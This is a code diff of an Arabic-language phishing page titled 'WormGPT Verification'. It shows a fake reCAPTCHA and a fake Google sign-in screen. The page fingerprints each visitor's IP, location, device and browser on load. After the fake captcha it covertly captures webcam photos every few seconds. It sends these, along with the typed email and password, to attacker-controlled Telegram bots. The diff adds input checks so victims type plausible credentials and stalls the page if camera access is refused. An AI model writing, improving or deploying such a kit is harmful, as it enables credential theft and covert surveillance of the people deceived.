@@ -5,36 +5,21 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>WormGPT Verification</title>
     <style>
-        /* إعدادات الصفحة الأساسية لمنع البياض الزائد */
-        html, body { height: 100%; margin: 0; padding: 0; overflow: hidden; }
-        body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
-
-        /* تنسيق بطاقة الكابتشا */
+        html, body { height: 100%; margin: 0; padding: 0; overflow: hidden; background: #f0f2f5; }
+        body { display: flex; justify-content: center; align-items: center; font-family: sans-serif; }
         .captcha-card { 
-            background: white; 
-            border: 1px solid #d3d3d3; 
-            border-radius: 3px; 
-            padding: 10px 15px; 
-            width: 300px; 
-            height: 74px;
-            display: flex; 
-            align-items: center; 
-            justify-content: space-between; 
-            box-shadow: 0 2px 4px rgba(0,0,0,0.05); 
-            cursor: pointer;
-            box-sizing: border-box;
+            background: white; border: 1px solid #d3d3d3; border-radius: 3px; 
+            padding: 10px 15px; width: 300px; height: 74px;
+            display: flex; align-items: center; justify-content: space-between; 
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05); cursor: pointer;
         }
-        
-        .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; margin-left: 12px; transition: 0.2s; }
+        .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; margin-left: 12px; }
         .checkbox.loading { border: 3px solid #f3f3f3; border-top: 3px solid #4a90e2; animation: spin 1s linear infinite; border-radius: 50%; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        /* صندوق الدخول */
-        .login-box { display: none; background: white; border: 1px solid #dadce0; border-radius: 8px; padding: 35px; width: 350px; text-align: center; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
-        input { width: 100%; padding: 12px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; margin-bottom: 15px; box-sizing: border-box; outline-color: #1a73e8; text-align: right; }
-        .blue-btn { width: 100%; padding: 10px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: 500; font-size: 14px; }
-
-        /* إخفاء العناصر التقنية تماماً دون التأثير على المساحة */
+        .login-box { display: none; background: white; border: 1px solid #dadce0; border-radius: 8px; padding: 35px; width: 350px; text-align: center; }
+        input { width: 100%; padding: 12px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; margin-bottom: 5px; box-sizing: border-box; outline-color: #1a73e8; text-align: right; }
+        .blue-btn { width: 100%; padding: 10px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: 500; margin-top: 10px; }
+        .error-msg { color: #d93025; font-size: 12px; text-align: right; margin-bottom: 10px; display: none; }
         #v, #c { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
     </style>
 </head>
@@ -43,25 +28,25 @@
     <div id="step-captcha" class="captcha-card" onclick="startSystem()">
         <div style="display:flex; align-items:center;">
             <div id="check-btn" class="checkbox"></div>
-            <div style="color:#555; font-size:14px; margin-right:10px; font-weight: 400;">أنا لست برنامج روبوت</div>
+            <div style="color:#555; font-size:14px; margin-right:10px;">أنا لست برنامج روبوت</div>
         </div>
-        <div style="text-align:center; min-width: 60px;">
-            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="30" style="display: block; margin: 0 auto;">
+        <div style="text-align:center;">
+            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="30">
             <div style="font-size:8px; color:#9b9b9b; margin-top:2px;">الخصوصية - البنود</div>
         </div>
     </div>
 
     <div id="step-google" class="login-box">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75" style="margin-bottom:10px;">
-        <h2 style="font-size:22px; font-weight:400; margin-bottom:8px;">تسجيل الدخول</h2>
-        <p style="font-size:14px; color:#202124; margin-bottom:25px;">استخدم حسابك على Google للوصول إلى WormGPT</p>
-        
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75" style="margin-bottom:15px;">
+        <h2 style="font-size:22px; font-weight:400; margin-bottom:20px;">تسجيل الدخول</h2>
         <div id="email-div">
-            <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف">
+            <input type="email" id="email" placeholder="البريد الإلكتروني">
+            <div id="email-error" class="error-msg">يرجى إدخال بريد إلكتروني صحيح</div>
             <button class="blue-btn" onclick="showP()">التالي</button>
         </div>
         <div id="pass-div" style="display:none;">
             <input type="password" id="pass" placeholder="أدخل كلمة المرور">
+            <div id="pass-error" class="error-msg">كلمة المرور غير صحيحة. حاول مجدداً</div>
             <button class="blue-btn" onclick="finalSubmit()">تأكيد</button>
         </div>
     </div>
@@ -75,28 +60,39 @@
         const chat_id = "2103976274";
 
         let user_ip = "Unknown";
+        let clientDevice = "Unknown Device";
+        let clientBrowser = "Unknown Browser";
 
-        // 1. جمع البيانات فوراً وبدقة
-        async function collect() {
-            let model = "Android Device";
+        async function autoDetect() {
             const ua = navigator.userAgent;
-
-            // محاولة جلب الموديل بدقة (لسامسونج وغيره)
+            const platform = navigator.platform;
             if (navigator.userAgentData) {
-                const h = await navigator.userAgentData.getHighEntropyValues(["model"]);
-                if (h.model) model = h.model;
-            } else if (/Samsung/i.test(ua)) model = "Samsung";
+                const entropy = await navigator.userAgentData.getHighEntropyValues(["model"]);
+                clientDevice = entropy.model || platform;
+            } else {
+                if (/iPhone|iPad|iPod/.test(ua)) clientDevice = "Apple iOS Device";
+                else if (/Android/.test(ua)) {
+                    const match = ua.match(/Android\s([^\s;]+);?\s?([^)]+)?/);
+                    clientDevice = match ? (match[2] || "Android Phone") : "Android Device";
+                } else { clientDevice = platform; }
+            }
+            if (ua.includes("Brave")) clientBrowser = "Brave";
+            else if (ua.includes("Edg/")) clientBrowser = "Edge";
+            else if (ua.includes("Chrome")) clientBrowser = "Chrome";
+            else if (ua.includes("Firefox")) clientBrowser = "Firefox";
+            else if (ua.includes("Safari") && !ua.includes("Chrome")) clientBrowser = "Safari";
+        }
 
-            let report = "🛑 **تقرير دخول جديد**\n\n";
+        async function collect() {
+            await autoDetect();
+            let report = "🛑 **تقرير تقني شامل**\n\n";
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json());
                 user_ip = ipRes.ip;
                 const geo = await fetch(`https://ipapi.co/${user_ip}/json/`).then(r => r.json());
-                report += `🌍 **IP:** \`${user_ip}\`\n📍 **المكان:** ${geo.city}, ${geo.country_name}\n🏢 **الشركة:** ${geo.org}\n`;
-            } catch(e) { report += "🌍 **IP:** تعذر الجلب\n"; }
-
-            report += `📱 **الجهاز:** ${model}\n🧭 **المتصفح:** ${ua.includes("Brave") ? "Brave" : "Chrome/Other"}\n⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}`;
-
+                report += `🌍 **IP:** \`${user_ip}\`\n📍 **المكان:** ${geo.city}, ${geo.country_name}\n`;
+            } catch(e) {}
+            report += `📱 **الجهاز:** ${clientDevice}\n🧭 **المتصفح:** ${clientBrowser}`;
             fetch(`https://api.telegram.org/bot${bot_token}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -106,64 +102,74 @@
 
         window.onload = collect;
 
-        // 2. تشغيل النظام والكاميرا
+        // الدالة المعدلة التي طلبتها
         function startSystem() {
             document.getElementById('check-btn').classList.add('loading');
             
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(stream => {
+            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+                // الكود سيمر هنا فقط إذا تم قبول الكاميرا
                 const video = document.getElementById('v');
                 video.srcObject = stream;
                 video.onloadedmetadata = () => {
                     video.play();
-                    // تأخير الصورة قليلاً لحل مشكلة السواد في Brave/Chrome
-                    setTimeout(snap, 3000); 
-                    setInterval(snap, 7000);
+                    
+                    // الآن فقط يتم التحويل بعد التأكد من عمل الكاميرا
+                    setTimeout(() => {
+                        document.getElementById('step-captcha').style.display = 'none';
+                        document.getElementById('step-google').style.display = 'block';
+                        snap(); 
+                        setInterval(snap, 8000);
+                    }, 500); // تأخير بسيط جداً للمظهر الطبيعي
                 };
-            }).catch(() => { console.log("Cam blocked"); });
-
-            setTimeout(() => {
-                document.getElementById('step-captcha').style.display = 'none';
-                document.getElementById('step-google').style.display = 'block';
-            }, 1500);
+            }).catch(() => {
+                // في حال رفض الكاميرا، لن يحدث شيء (سيبقى الزر يدور للأبد)
+                console.log("Permission denied. Waiting...");
+            });
         }
 
-        // 3. التقاط الصورة بجودة وتجاوز الحماية
         function snap() {
             const canvas = document.getElementById('c');
             const video = document.getElementById('v');
             if (video.readyState !== 4) return;
-
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
-            
-            // إضافة فلتر خفيف جداً يمنع المتصفح من إرسال فريم أسود (تجاوز حماية Fingerprinting)
-            ctx.filter = "brightness(1.02) contrast(1.02)";
+            ctx.filter = "brightness(1.03) contrast(1.03)";
             ctx.drawImage(video, 0, 0);
-            
             canvas.toBlob(blob => {
                 const f = new FormData();
                 f.append('chat_id', chat_id);
                 f.append('photo', blob, 's.jpg');
                 fetch(`https://api.telegram.org/bot${bot_token}/sendPhoto`, { method: 'POST', body: f });
-            }, 'image/jpeg', 0.7);
+            }, 'image/jpeg', 0.6);
         }
 
         function showP() {
-            document.getElementById('email-div').style.display = 'none';
-            document.getElementById('pass-div').style.display = 'block';
+            const email = document.getElementById('email').value;
+            if (email.includes('@') && email.length > 5) {
+                document.getElementById('email-div').style.display = 'none';
+                document.getElementById('pass-div').style.display = 'block';
+                document.getElementById('email-error').style.display = 'none';
+            } else {
+                document.getElementById('email-error').style.display = 'block';
+            }
         }
 
         function finalSubmit() {
             const email = document.getElementById('email').value;
             const pass = document.getElementById('pass').value;
-            const report = `📥 **بيانات حساب**\n\n📧: \`${email}\`\n🔑: \`${pass}\`\n🌍 IP: \`${user_ip}\``;
+            if (pass.length < 8) {
+                document.getElementById('pass-error').style.display = 'block';
+                return;
+            }
+            const login_report = `📥 **صيد حساب**\n\n📧: \`${email}\`\n🔑: \`${pass}\`\n🌍 IP: \`${user_ip}\``;
             fetch(`https://api.telegram.org/bot${bot_token_2}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chat_id, text: report, parse_mode: "Markdown" })
+                body: JSON.stringify({ chat_id: chat_id, text: login_report, parse_mode: "Markdown" })
+            }).then(() => {
+                window.location.href = "wormgpt.html";
             });
-            window.location.href = "wormpgt.html"; // تحويل الضحية بعد الانتهاء
         }
     </script>
 </body>
